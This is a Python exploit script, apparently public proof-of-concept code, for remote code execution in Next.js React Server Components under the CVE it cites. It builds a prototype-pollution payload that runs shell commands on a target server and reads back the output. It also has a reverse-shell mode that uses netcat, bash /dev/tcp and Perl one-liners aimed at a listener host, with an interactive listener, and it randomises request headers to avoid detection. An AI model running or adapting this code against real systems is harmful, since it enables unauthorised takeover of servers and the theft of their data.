import re
import sys
import time
import base64
import random
import socket
import select
import string
import urllib3
import requests
import threading
import rich_click as click

from urllib.parse import unquote
from rich.console import Console
from fake_useragent import UserAgent

console = Console()


class Exploit:
    def __init__(self):
        self.timeout = 10
        self.verify_ssl = False
    
    def normalize_url(self, host: str) -> str:
        host = host.strip()
        if not host:
            return ""
        if not host.startswith(("http://", "https://")):
            host = f"https://{host}"
        return host.rstrip("/")
    
    def _random(self, chars: str, length: int) -> str:
        return ''.join(random.choices(chars, k=length))
    
    def random_boundary(self) -> str:
        return f"----{self._random(string.ascii_letters + string.digits, 24)}"
    
    def random_ua(self) -> str:
        return UserAgent().random
    
    def random_hex(self, length: int = 8) -> str:
        return self._random(string.hexdigits.lower(), length)
    
    def random_str(self, length: int = 16) -> str:
        return self._random(string.ascii_letters + string.digits, length)
    
    def random_action(self) -> str:
        return self._random(string.ascii_lowercase + string.digits, random.randint(1, 10))
    
    def build_payload(self, cmd: str, is_reverse_shell: bool = False) -> tuple[str, str]:
        boundary = self.random_boundary()
        boundary_clean = boundary.replace("----", "")

        cmd_escaped = cmd.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
        if is_reverse_shell:
            prefix_payload = f"process.mainModule.require('child_process').exec('{cmd_escaped}',{{detached:true,stdio:'ignore'}},function(){{}});throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: 'NEXT_REDIRECT;push;/login;307;'}});"
        else:
            prefix_payload = f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}').toString().trim();var encoded=Buffer.from(res).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{encoded}};307;`}});"

        # Randomize the reference ID (keeping $1 format but using random index)
        random_ref_idx = str(random.randint(1, 9))
        random_id = self._random(string.ascii_uppercase + string.digits, 4)
        random_reason = random.randint(-5, -1)
        # $Q2 must stay fixed, other values cause errors
        part0 = '{"then":"$' + random_ref_idx + ':__proto__:then","status":"resolved_model","reason":' + str(random_reason) + ',"value":"{\\"then\\":\\"$B' + random_id + '\\"}","_response":{"_prefix":"' + prefix_payload + '","_chunks":"$Q2","_formData":{"get":"$' + random_ref_idx + ':constructor:constructor"}}}'

        # Adjust body to match the random index
        body_parts = [f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}"]
        for i in range(1, int(random_ref_idx) + 1):
            if i == int(random_ref_idx):
                body_parts.append(f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"{i}\"\r\n\r\n\"$@0\"")
            else:
                body_parts.append(f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"{i}\"\r\n\r\nnull")
        body_parts.append(f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"{int(random_ref_idx) + 1}\"\r\n\r\n[]")
        body_parts.append(f"--{boundary_clean}--")
        body = "\r\n".join(body_parts)

        content_type = f"multipart/form-data; boundary={boundary_clean}"
        return body, content_type
    
    def send_request(self, target_url: str, headers: dict, body: str) -> tuple[requests.Response | None, str | None]:
        try:
            response = requests.post(target_url, headers=headers, data=body, timeout=self.timeout, verify=self.verify_ssl, allow_redirects=False)
            return response, None
        except Exception as e:
            return None, str(e)
    
    def parse_output(self, response: requests.Response) -> tuple[bool, str]:
        redirect_header = response.headers.get("X-Action-Redirect", "")
        if not redirect_header:
            return False, ""
        match = re.search(r'/login\?a=([^;]+)', redirect_header)
        if not match:
            return False, ""
        encoded_output = unquote(match.group(1))
        try:
            return True, base64.b64decode(encoded_output).decode('utf-8')
        except:
            return True, encoded_output
    
    def get_reverse_shell_payload(self, payload_type: str, lhost: str, lport: int) -> str:
        payloads = {
            "nc": f"nc -e sh {lhost} {lport} || nc {lhost} {lport} -e /bin/sh &",
            "nc-mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f &",
            "sh": f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1 &",
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};' &"
        }
        return payloads.get(payload_type.lower(), payloads["nc"])
    
    def _create_listener(self, lhost: str, lport: int) -> socket.socket:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0" if lhost == "0.0.0.0" else lhost, lport))
        server.listen(1)
        server.settimeout(10)
        return server
    
    def _interactive_shell(self, client: socket.socket):
        while True:
            ready, _, _ = select.select([client, sys.stdin], [], [])
            if client in ready:
                data = client.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
            if sys.stdin in ready:
                data = sys.stdin.read(1)
                if not data:
                    break
                client.send(data.encode())
    
    def reverse_shell_listener(self, lhost: str, lport: int, url: str, payload_type: str):
        reverse_cmd = self.get_reverse_shell_payload(payload_type, lhost, lport)
        console.print(f"[cyan][*][/cyan] Starting reverse shell listener on {lhost}:{lport}")
        server = self._create_listener(lhost, lport)
        console.print(f"[cyan][*][/cyan] Sending reverse shell payload...")
        threading.Thread(target=lambda: (time.sleep(1), self.execute(url, reverse_cmd, is_reverse_shell=True)), daemon=True).start()
        console.print(f"[green]Waiting for connection...[/green]")
        try:
            client, addr = server.accept()
            console.print(f"[green]Reverse shell connection established from {addr[0]}:{addr[1]}![/green]")
            self._interactive_shell(client)
        except socket.timeout:
            console.print(f"[red]Failed to establish reverse shell connection (timeout)[/red]")
        except Exception as e:
            console.print(f"[red]Error: {str(e)}[/red]")
        finally:
            server.close()
            if 'client' in locals():
                client.close()
    
    def execute(self, host: str, cmd: str, is_reverse_shell: bool = False) -> tuple[bool, str, int]:
        host = self.normalize_url(host)
        if not host:
            return False, "Invalid or empty host", 0
        body, content_type = self.build_payload(cmd, is_reverse_shell)
        headers = {"User-Agent": self.random_ua(), "Next-Action": self.random_action(), "X-Nextjs-Request-Id": self.random_hex(), "Content-Type": content_type, "X-Nextjs-Html-Request-Id": self.random_str()}
        response, error = self.send_request(f"{host}/", headers, body)
        if error:
            return False, error, 0
        is_vuln, output = self.parse_output(response)
        return (True, output, response.status_code) if is_vuln else (False, "", response.status_code)


@click.command(help="**Next.js React Server Components RCE Exploit**\n\nExploits CVE-2025-55182 for remote code execution via prototype pollution.\n\nBy Chocapikk")
@click.option("-u", "--url", required=True, help="URL/host to check")
@click.option("-c", "--cmd", help="Command to execute")
@click.option("-r", "--reverse", is_flag=True, help="Enable reverse shell mode")
@click.option("-l", "--lhost", help="Listener host for reverse shell")
@click.option("-p", "--lport", type=int, help="Listener port for reverse shell")
@click.option("-P", "--payload", type=click.Choice(["nc", "nc-mkfifo", "sh", "bash", "perl"], case_sensitive=False), default="nc", help="Reverse shell payload type (default: nc)")
@click.option("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
def main(url, cmd, reverse, lhost, lport, payload, timeout):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exp = Exploit()
    exp.timeout = timeout
    
    if reverse:
        if not lhost or not lport:
            console.print(f"[red]Error: --lhost and --lport required for reverse shell mode[/red]")
            return
        exp.reverse_shell_listener(lhost, lport, url, payload)
        return
    
    if not cmd:
        console.print(f"[red]Error: --cmd required (or use --reverse for reverse shell)[/red]")
        return
    
    vuln, output, status = exp.execute(url, cmd)
    if not vuln and output:
        console.print(f"[red]Error: {output}[/red]")
        return
    if vuln:
        console.print(f"[green]Success[/green]")
        console.print(output)
        return
    console.print(f"[yellow]Failed (status: {status})[/yellow]")


if __name__ == "__main__":
    main()
